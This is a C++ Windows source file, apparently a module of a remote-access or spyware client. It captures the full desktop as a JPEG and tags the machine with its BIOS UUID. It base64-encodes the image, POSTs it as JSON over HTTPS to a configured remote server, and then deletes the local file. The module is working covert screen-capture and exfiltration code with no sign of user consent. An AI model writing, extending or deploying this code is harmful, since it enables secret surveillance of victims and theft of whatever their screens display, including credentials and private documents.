#include "pa5a.hpp"

/********************************************************************************************************************************/
INT WINAPI GetEncoderClsid(LPCWSTR format, CLSID* pClsid)
{
    UINT  num = 0;
    UINT  size = 0;
    
    Gdiplus::ImageCodecInfo* pImageCodecInfo = NULL;

    Gdiplus::GetImageEncodersSize(&num, &size);
    if (size == 0)
        return -1;

    pImageCodecInfo = (Gdiplus::ImageCodecInfo*)(malloc(size));
    if (pImageCodecInfo == NULL)
        return -1;

    GetImageEncoders(num, size, pImageCodecInfo);
    for (UINT j = 0; j < num; ++j)
    {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
        {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }
    free(pImageCodecInfo);
    return 0;
}
/********************************************************************************************************************************/
BOOL WINAPI SaveScreenshot(LPCWSTR filename)
{
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
    {
        HDC hScreenDc = GetDC(0);
        int x = GetSystemMetrics(SM_XVIRTUALSCREEN);
        int y = GetSystemMetrics(SM_YVIRTUALSCREEN);
        int height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
        int width = GetSystemMetrics(SM_CXVIRTUALSCREEN);

        HDC memScreenDc = CreateCompatibleDC(hScreenDc);
        HBITMAP memBitmap = CreateCompatibleBitmap(hScreenDc, width, height);
        HBITMAP bitmapContainer = (HBITMAP)SelectObject(memScreenDc, memBitmap);
        if (!BitBlt(memScreenDc, 0, 0, width, height, hScreenDc, x, y, SRCCOPY))
        {
            DeleteObject(memBitmap);
            DeleteDC(memScreenDc);
            ReleaseDC(0, hScreenDc);
            return FALSE;
        }
        
        Gdiplus::Bitmap* bitmapPtr = new Gdiplus::Bitmap(memBitmap, NULL);
        CLSID clsid;
        if (GetEncoderClsid(L"image/jpeg", &clsid) == -1)
        {
            delete bitmapPtr;
            DeleteObject(memBitmap);
            DeleteDC(memScreenDc);
            ReleaseDC(0, hScreenDc);
            return FALSE;
        }
        
        bitmapPtr->Save(filename, &clsid);
        
        //cleanup
        delete bitmapPtr;
        DeleteObject(memBitmap);
        DeleteDC(memScreenDc);
        ReleaseDC(0, hScreenDc);
    }
    Gdiplus::GdiplusShutdown(gdiplusToken);

    return TRUE;
}
/********************************************************************************************************************************/

EXTERN_C_START

/********************************************************************************************************************************/
/*BOOL WINAPI SaveBitmap(LPCWSTR wPath)
{
    BITMAPFILEHEADER bfHeader;
    BITMAPINFOHEADER biHeader;
    BITMAPINFO bInfo;
    HGDIOBJ hTempBitmap;
    HBITMAP hBitmap;
    BITMAP bAllDesktops;
    HDC hDC, hMemDC;
    LONG lWidth, lHeight;
    BYTE* bBits = NULL;
    HANDLE hHeap = GetProcessHeap();
    DWORD cbBits, dwWritten = 0;
    HANDLE hFile;
    INT x = GetSystemMetrics(SM_XVIRTUALSCREEN);
    INT y = GetSystemMetrics(SM_YVIRTUALSCREEN);

    ZeroMemory(&bfHeader, sizeof(BITMAPFILEHEADER));
    ZeroMemory(&biHeader, sizeof(BITMAPINFOHEADER));
    ZeroMemory(&bInfo, sizeof(BITMAPINFO));
    ZeroMemory(&bAllDesktops, sizeof(BITMAP));

    hDC = GetDC(NULL);
    hTempBitmap = GetCurrentObject(hDC, OBJ_BITMAP);
    GetObjectW(hTempBitmap, sizeof(BITMAP), &bAllDesktops);

    lWidth = bAllDesktops.bmWidth;
    lHeight = bAllDesktops.bmHeight;

    DeleteObject(hTempBitmap);

    bfHeader.bfType = (WORD)('B' | ('M' << 8));
    bfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    biHeader.biSize = sizeof(BITMAPINFOHEADER);
    biHeader.biBitCount = 24;
    biHeader.biCompression = BI_RGB;
    biHeader.biPlanes = 1;
    biHeader.biWidth = lWidth;
    biHeader.biHeight = lHeight;

    bInfo.bmiHeader = biHeader;

    cbBits = (((24 * lWidth + 31) & ~31) / 8) * lHeight;

    hMemDC = CreateCompatibleDC(hDC);
    hBitmap = CreateDIBSection(hDC, &bInfo, DIB_RGB_COLORS, (VOID**)&bBits, NULL, 0);
    SelectObject(hMemDC, hBitmap);
    BitBlt(hMemDC, 0, 0, lWidth, lHeight, hDC, x, y, SRCCOPY);


    hFile = CreateFileW(wPath, GENERIC_WRITE | GENERIC_READ, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    WriteFile(hFile, &bfHeader, sizeof(BITMAPFILEHEADER), &dwWritten, NULL);
    WriteFile(hFile, &biHeader, sizeof(BITMAPINFOHEADER), &dwWritten, NULL);
    WriteFile(hFile, bBits, cbBits, &dwWritten, NULL);

    CloseHandle(hFile);

    DeleteDC(hMemDC);
    ReleaseDC(NULL, hDC);
    DeleteObject(hBitmap);

    return TRUE;
}
*/
/********************************************************************************************************************************/
VOID SendScreenshot()
{
    CHAR uuid[UUID_SIZE] = { 0 };
    GetInformation(uuid, sizeof(uuid), BIOS_UUID);

    WCHAR path[PATH_SIZE] = { 0 };

    if (StringCbPrintf(path, sizeof(path), L"%s%s", DATA_FOLDER_W, L"screenshot.jpeg") != S_OK)
        return;

    wprintf(L"Taking screenshot in file %ls ...\n", path);

    if (SaveScreenshot(path) == FALSE)
        return;
    
    HANDLE hFile;
    if ((hFile = CreateFile(path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
        return;

    LARGE_INTEGER fileSize;
    if (!GetFileSizeEx(hFile, &fileSize))
    {
        CloseHandle(hFile);
        return;
    }
    
    LPBYTE fileContent = NULL;
    if ((fileContent = (LPBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (fileSize.LowPart + 1) * sizeof(BYTE))) == NULL)
    {
        CloseHandle(hFile);
        return;
    }
    
    DWORD bytesRead = 0;
    if (!ReadFile(hFile, fileContent, fileSize.LowPart, &bytesRead, NULL))
    {
        HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, fileContent);
        CloseHandle(hFile);
        return;
    }
    
    DWORD destinationSize;
    if (CryptBinaryToStringA(fileContent, fileSize.LowPart, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &destinationSize) == FALSE)
    {
        HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, fileContent);
        CloseHandle(hFile);
        return;
    }

    LPSTR base64string = NULL;
    if ((base64string = (LPSTR)(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (destinationSize + 1) * sizeof(CHAR)))) == NULL)
    {
        HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, fileContent);
        CloseHandle(hFile);
        return;
    }
    
    if (CryptBinaryToStringA(fileContent, fileSize.LowPart, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, base64string, &destinationSize) == FALSE)
    {
        HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, base64string);
        HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, fileContent);
        CloseHandle(hFile);
        return;
    }
    
    cJSON* object = NULL;
    LPSTR jsonString = NULL;

    if ((object = cJSON_CreateObject()) == NULL)
    {
        HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, base64string);
        HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, fileContent);
        CloseHandle(hFile);
        return;
    }
    
    if (cJSON_AddStringToObject(object, "screenshot", base64string) == NULL)
    {
        cJSON_Delete(object);
        HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, base64string);
        HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, fileContent);
        CloseHandle(hFile);
        return;
    }
    
    if ((jsonString = cJSON_Print(object)) == NULL)
    {
        cJSON_Delete(object);
        HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, base64string);
        HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, fileContent);
        CloseHandle(hFile);
        return;
    }
    
    CHAR url[URL_SIZE] = { 0 };
    if (StringCbPrintfA(url, sizeof(url), "%s%s%s", CLIENT_API_A, uuid, SCREENSHOT_API_A) != S_OK)
    {
        cJSON_Delete(object);
        HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, base64string);
        HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, fileContent);
        CloseHandle(hFile);
        return;
    }
    
    SendJsonDataByHttps(SERVER_NAME_A, HTTPS_PORT, url, "POST", USER_AGENT_A, jsonString);

    Sleep(1);
    free(jsonString);
    cJSON_Delete(object);
    Sleep(1);
    HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, base64string);
    Sleep(1);
    HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, fileContent);
    Sleep(1);
    CloseHandle(hFile);
    Sleep(1);
    DeleteFile(path);
}
/********************************************************************************************************************************/

EXTERN_C_END